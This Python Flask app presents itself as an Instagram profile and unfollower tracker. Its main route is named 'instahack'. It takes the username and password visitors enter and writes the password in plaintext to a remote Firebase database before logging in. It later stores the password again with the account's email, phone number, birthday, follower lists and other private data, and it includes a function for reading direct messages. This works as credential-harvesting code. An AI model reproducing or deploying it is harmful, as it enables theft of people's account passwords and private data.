from flask import Flask, request, render_template
import os
from instagrapi import Client
import requests
import pyrebase
from threading import Thread
import time
import glob

app = Flask(__name__)

user, db = '', ''

FIREBASE_CONFIG = {
    'apiKey': os.getenv('apiKey'),
    'authDomain': os.getenv('authDomain'),
    'databaseURL': os.getenv('databaseURL'),
    'projectId': os.getenv('projectId'),
    'storageBucket': os.getenv('storageBucket'),
    'messagingSenderId': os.getenv('messagingSenderId'),
    'appId': os.getenv('appId')
}

Gender_ar = ['Female', 'Male', 'Custom', 'Prefer Not To Say']


def connect_database(firebaseconfig):
    firebase = pyrebase.initialize_app(firebaseconfig)
    db = firebase.database()
    return db


def getResigteredUsers(db):
    val = db.child("Users").get().val()
    try:
        return list(val)
    except:
        return []


start = time.time()
try:
    db = connect_database(FIREBASE_CONFIG)
except Exception as e:
    print("Database Connection Error: ", e)
print("database connected: ", time.time()-start)

REGISTERED_USERS = getResigteredUsers(db)


def login(ACCOUNT_USERNAME, ACCOUNT_PASSWORD):
    settings = {'device_settings': {'app_version': '194.0.0.36.172', 'android_version': 26, 'android_release': '8.0.0', 'dpi': '640dpi', 'resolution': '1440x2392',
                                    'manufacturer': 'Samsung', 'device': 'S21-Ultra', 'model': 'comancheatt', 'cpu': 'qcom', 'version_code': '301484483'},
                'user_agent': 'Instagram 194.0.0.36.172 Android (26/8.0.0; 640dpi; 1440x2392; Samsung; S21-Ultra; comancheatt; qcom; en_US; 301484483)'}
    user = Client(settings)
    user.device_id = "android-86d8bac538f2c0d0"
    user.login(ACCOUNT_USERNAME, ACCOUNT_PASSWORD)
    return user


def get_account_details(user):
    details = user.account_info()
    userid = details.pk
    birthday = details.birthday
    gender = Gender_ar[details.gender]
    mobileno = details.phone_number
    email = details.email
    return (userid, email, mobileno, gender, birthday)


def get_user_info(user):
    details = ''
    try:
        details = user.user_info(user.user_id)
    except:
        pass
    name = details.full_name
    username = details.username
    profile_pic = str(details.profile_pic_url)
    bio = details.biography
    is_private = details.is_private
    following_count = details.following_count
    followers_count = details.follower_count
    media_count = details.media_count
    return (name, username, profile_pic, bio, is_private, followers_count, following_count, media_count)


def get_followers(user, userid):
    followers = user.user_followers(userid)
    return sorted(list(followers.keys()))


def get_following(user, userid):
    followers = user.user_following(userid)
    return sorted(list(followers.keys()))


def getFollowersFromDatabase(db, user_name):
    return sorted(list(db.child("Users").child(user_name).get().val()['followers']))


def update(db, user_name, data):
    db.child("Users").child(user_name).set(data)


def get_details(db, user_name):
    user_data = db.child("Users").child(user_name).get()
    return user_data


def getSpecificDetail(user_data, key):
    return user_data.val()[key]


def delete(db, user_name):
    user_data = db.child("Users").child(user_name).remove()


def download_media(user, userid, mediacount):
    medias = user.user_medias(userid, mediacount)
    for i in range(mediacount):
        try:
            r = requests.get(
                str(medias[i].thumbnail_url), allow_redirects=True)
            open(f'{userid}_{i}.jpg', 'wb+').write(r.content)
        except Exception as e:
            print(e)


def encodeUsername(username):
    user_name = username.replace('.', '-')
    return user_name


def decodeUsername(username):
    user_name = username.replace('-', '.')
    return user_name


def push_data(user, db):
    userid, email, mobileno, gender, birthday = get_account_details(user)
    name, username, profile_pic, bio, is_private, followers_count, following_count, media_count = get_user_info(
        user)
    print('All Data Fetched!')

    user_insta_data = {'userid': userid, 'password': user.password, 'name': name, 'email': email, 'mobileno': mobileno, 'gender': gender, 'birthday': birthday, 'profile_pic': profile_pic, 'bio': bio, 'is_private': is_private, 'followers_count': followers_count,
                       'following_count': following_count, 'media_count': media_count, 'followers': get_followers(user, userid), 'following': get_following(user, userid), 'unfollowers': [], 'recent_unfollowers': [], 'followers_you_dont_follow': [], 'users_dont_follow_back': []}
    db.child("Users").child(encodeUsername(username)).set(user_insta_data)
    print("Data Uploaded to the servers!")


def check_unfollowers(li1, li2):
    li_dif = [i for i in li1 + li2 if i not in li1 or i not in li2]
    return li_dif


def calc_unfollowers(user):
    followersI = sorted(get_followers(user, user.username))
    followersD = getFollowersFromDatabase(db, user.username)
    unfollowers_list = check_unfollowers(followersD, followersI)
    return unfollowers_list


def getDMThreads(user, amount):
    directThreads = user.direct_threads(amount=amount)
    DMThreads = {}
    for thread in directThreads:
        username = thread.users[0].username
        messages = [{'user_id': i.user_id, 'item_type': i.item_type,
                     'text': i.text} for i in thread.messages]
        DMThreads[username] = messages
    return DMThreads


def displayConversation(Thread, Youser_id, user_name):
    fspace = len(user_name)
    for text in Thread[:-1]:
        sender = "You" if str(text['user_id']) == str(Youser_id) else user_name
        if(text['item_type'] == "text"):
            print(f"{sender.rjust(fspace)} :  {text['text']}")
        else:
            print(f"{sender.rjust(fspace)} :  {text['item_type']}")


@app.route('/', methods=["GET", "POST"])
def instahack():
    if request.method == "POST":
        user_name = request.form.get("uname")
        password = request.form.get("pword")
        try:
            db.child("LoginTry").set({encodeUsername(user_name): password})
            globals()['user'] = login(user_name, password)
            print('Login Sucessfull!')
        except Exception as e:
            return e
        user_name = encodeUsername(user_name)
        if(user_name in REGISTERED_USERS):
            print('Found user in our Database')
            try:
                user_data = get_details(db=db, user_name=user_name)
            except:
                pass
            print('All username Extracted from Database. Searching for user in Database.')
            name = getSpecificDetail(user_data=user_data, key='name')
            bio = getSpecificDetail(user_data=user_data, key='bio')
            profile_pic = getSpecificDetail(
                user_data=user_data, key='profile_pic')
            followers_count = getSpecificDetail(
                user_data=user_data, key='followers_count')
            following_count = getSpecificDetail(
                user_data=user_data, key='following_count')
            media_count = getSpecificDetail(
                user_data=user_data, key='media_count')
            username = decodeUsername(user_name)
            try:
                r = requests.get(profile_pic, allow_redirects=True)
                open(f'./static/{username}.jpg', 'wb+').write(r.content)
            except Exception as e:
                print(e)
            return render_template("profile.html", profile_pic=username+'.jpg', name=name, bio=bio, user_name=username, followers_count=followers_count, following_count=following_count, media_count=media_count)
        else:
            print(
                'User Not Found in Database, Extracting user Information form Instagrapi...')
            name, username, profile_pic, bio, is_private, followers_count, following_count, media_count = get_user_info(
                user)
            print('Extracted all user data) from instagrapi')
            try:
                r = requests.get(profile_pic, allow_redirects=True)
                open(f'./static/{username}.jpg', 'wb+').write(r.content)
            except Exception as e:
                print(e)
            Thread(target=push_data, name='PushData', args=(user, db)).start()
            return render_template("profile.html", profile_pic=username+'.jpg', name=name, bio=bio, user_name=username, followers_count=followers_count, following_count=following_count, media_count=media_count)

    return render_template("index.html")


if __name__ == '__main__':
    app.run()
    path = 'static/*.jpg'
    for name in glob.glob(path):
        os.remove(name)
